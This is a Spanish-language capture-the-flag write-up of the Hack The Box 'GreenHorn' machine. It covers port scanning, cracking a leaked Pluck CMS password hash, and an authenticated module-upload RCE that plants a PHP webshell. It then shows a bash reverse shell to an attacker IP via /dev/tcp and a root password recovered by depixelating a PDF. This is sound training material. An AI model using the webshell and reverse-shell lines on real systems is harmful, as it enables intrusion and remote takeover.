---
title: GreenHorn - Hack The Box
date: 2024-10-06
description: Maquina GreenHorn (Easy) de Hack The Box.
categories:
    - Writeups
    - HTB
tags:
    - Linux
    - HTB
    - CTF
    - Easy
    - Seasonal
media_subpath: /assets/img/commons/greenhorn/
image: greenhorn.png
---

## Escaneo

```bash
nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn 10.10.11.23 -oG allPorts
```

Puertos abiertos: 22,80,3000,4446,8000

## Análisis

```bash
nmap -sCV -p22,80,3000,4446,8000 10.10.11.25 -oN targeted

22/tcp   open  ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http      nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://greenhorn.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  ppp?
4446/tcp open  n1-fwp?
8000/tcp open  http-alt?
```

El puerto 80 da acceso a la web de "http://greenhorn.htb", sin nada destacable.

Whatweb tampoco añade mayor información:
```bash
whatweb http://greenhorn.htb

http://greenhorn.htb [302 Found] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.25], RedirectLocation[http://greenhorn.htb/?file=welcome-to-greenhorn], nginx[1.18.0]
http://greenhorn.htb/?file=welcome-to-greenhorn [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.25], MetaGenerator[pluck 4.7.18], Pluck-CMS[4.7.18], Title[Welcome to GreenHorn ! - GreenHorn], nginx[1.18.0]
```

Enumerando con nmap se ven los siguientes directorios. Destacable los ficheros "login.php" y "admin.php":
```bash
nmap --script http-enum -p80 10.10.11.25 -oN webScan
80/tcp open  http
| http-enum: 
|   /admin.php: Possible admin folder
|   /login.php: Possible admin folder
|   /robots.txt: Robots file
|   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder
|   /cwhp/auditLog.do?file=..\..\..\..\..\..\..\boot.ini: Possible CiscoWorks (CuOM 8.0 and 8.5) Directory traversal (CVE-2011-0966) (Windows)
|   /cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program%20Files\CSCOpx\MDC\Tomcat\webapps\triveni\WEB-INF\classes\schedule.properties: Possible CiscoWorks (CuOM 8.0 and 8.5) Directory traversal (CVE-2011-0966) (Windows)
|   /cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program%20Files\CSCOpx\lib\classpath\com\cisco\nm\cmf\dbservice2\DBServer.properties: Possible CiscoWorks (CuOM 8.0 and 8.5) Directory traversal (CVE-2011-0966) (Windows)
|   /cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program%20Files\CSCOpx\log\dbpwdChange.log: Possible CiscoWorks (CuOM 8.0 and 8.5) Directory traversal (CVE-2011-0966) (Windows)
|   /CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.config: Cute Editor ASP.NET Remote File Disclosure ( CVE 2009-4665 )
|   /docs/README: Interesting, a readme.
|_  /data/: Potentially interesting folder
```

## Explotación

Accediendo a la maquina por el puerto 3000 se accede a un repositorio Gitea en el que se puede ver el código del CMS Pluck. En la carpeta "/data/settings/" se puede ver el fichero "pass.php" con la contraseña encriptada en sha512:

```php
<?php
$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';
?>
```

Pasando la clave a un desencriptador como [CrackStation](https://crackstation.net/) se obtiene la contraseña: `iloveyou1` que da acceso al panel del CMS.

En "http://greenhorn.htb/login.php" se puede ver un formulario de ingreso del CMS "Pluck" en versión 4.7.18.

Una busqueda de Exploits para Pluck arroja un RCE [CVE-2023-50564](https://nvd.nist.gov/vuln/detail/CVE-2023-50564) para la versión 4.7.18:

```bash
searchsploit pluck
---------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                   |  Path
---------------------------------------------------------------------------------------------------------------
Pluck CMS 4.5.1 (Windows) - 'blogpost' Local File Inclusion                      | php/webapps/6074.txt
Pluck CMS 4.5.2 - Multiple Cross-Site Scripting Vulnerabilities                  | php/webapps/32168.txt
Pluck CMS 4.5.2 - Multiple Local File Inclusions                                 | php/webapps/6300.txt
Pluck CMS 4.5.3 - 'g_pcltar_lib_dir' Local File Inclusion                        | php/webapps/7153.txt
Pluck CMS 4.5.3 - 'update.php' Remote File Corruption                            | php/webapps/6492.php
Pluck CMS 4.6.1 - 'module_pages_site.php' Local File Inclusion                   | php/webapps/8271.php
Pluck CMS 4.6.2 - 'langpref' Local File Inclusion                                | php/webapps/8715.txt
Pluck CMS 4.6.3 - 'cont1' HTML Injection                                         | php/webapps/34790.txt
Pluck CMS 4.7 - Directory Traversal                                              | php/webapps/36986.txt
Pluck CMS 4.7 - HTML Code Injection                                              | php/webapps/27398.txt
Pluck CMS 4.7 - Multiple Local File Inclusion / File Disclosure Vulnerabilities  | php/webapps/36129.txt
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)             | php/webapps/49909.py
Pluck CMS 4.7.16 - Remote Code Execution (RCE) (Authenticated)                   | php/webapps/50826.py
Pluck CMS 4.7.3 - Cross-Site Request Forgery (Add Page)                          | php/webapps/40566.py
Pluck CMS 4.7.3 - Multiple Vulnerabilities                                       | php/webapps/38002.txt
Pluck v4.7.18 - Remote Code Execution (RCE)                                      | php/webapps/51592.py
pluck v4.7.18 - Stored Cross-Site Scripting (XSS)                                | php/webapps/51420.txt
---------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
```

El exploit se basa en, una vez logeado en el panel de administración de Pluck, se aprobecha de la utilidad de instalación de modulos del CMS para subir un fichero .php malicioso comprimido en .zip.
El fichero es subido a "/admin.php?action=installmodule" que devuelve el nombre del "modulo", que posteriormente será usado para localizar el fichero .php malicioso en la carpeta "/data/modules/{nombre del modulo}/php_malicioso.php".

Haciendo uso del Exploit de [GitHub](https://github.com/opabravo/pluck-cms-rce) para automatizar la tarea, se pasan como parametros la URL del sitio, la contraseña obtenida anteriormente del fichero "pass.php" y el fichero .php malicioso. En este caso un rce.php con ``<?=`$_REQUEST[0]`;``:

```bash
python exploit.py -u http://greenhorn.htb -p 'iloveyou1' -f rce.php
[*] Logging in
[*] Uploading module
[+] Webshell uploaded to http://greenhorn.htb/data/modules/mdwqwwwl/x.php
```

Pasando una Reverse Shell como parametro se obtiene acceso a la maquina con el usuario www-data:
```bash
http://greenhorn.htb/data/modules/mdwqwwwl/x.php?0=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.15.23/443%200%3E%261%22
```

## Escalada

### User

En la carpeta "/home/" se pueden ver dos usuarios, "git" y "junior". Verificando la reutilización de la contraseña de Pluck se accede como usuario junior.

Este usuario tiene permisos para leer la User FLag.

### Root

Dentro del directorio "/home/junior" existe un documento PDF llamando "Using OpenVAS.pdf" que informa de la reciente instalación de OpenVAS y la contraseña. Pero esta contraseña se encuenta pixelada.

Descargando el pdf a la maquina local levantando un servidor http en python
```python
python3 -m http.server
```

Pasando el pdf a imagen con pdfimages:
```bash
pdfimages Using\ OpenVAS.pdf img
```

Y pasando la imagen generada por un depixelador como depix se obtiene la contraseña de root "sidefromsidetheothersidesidefromsidetheotherside":
```bash
python depix.py -p img-000.ppm -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
```

Accediendo por ssh como root se tiene acceso a la Root Flag.
